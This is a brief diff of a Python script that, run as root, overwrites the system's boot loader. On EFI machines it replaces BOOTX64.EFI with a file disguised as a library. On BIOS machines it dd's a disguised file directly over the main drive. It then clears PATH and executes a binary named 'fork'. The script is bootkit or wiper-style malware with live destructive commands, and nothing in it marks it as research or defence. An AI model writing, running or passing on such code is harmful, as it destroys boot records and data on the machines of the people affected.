@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/bin/python
 import os
 import platform
 import shutil
@@ -24,7 +24,7 @@ def runefi():
     shutil.copyfile("/lib/libefia.so", f"{bootmount}/EFI/BOOT/BOOTX64.EFI")
 
 def runbios():
-    os.system(f"dd if=/lib/libcryptos.so of={maindrive}")
+    os.system(f"dd if=/lib/libkryptos.so of={maindrive}")
 
 
 if os.getuid() != 0:
@@ -35,9 +35,9 @@ if os.path.isdir("/sys/firmware/efi"):
     runefi()
 else:
     runbios()
+    
+os.chdir("/lib")
 
 os.environ["PATH"] = ""
-
-os.chdir("/lib")
 
 os.system("./fork")
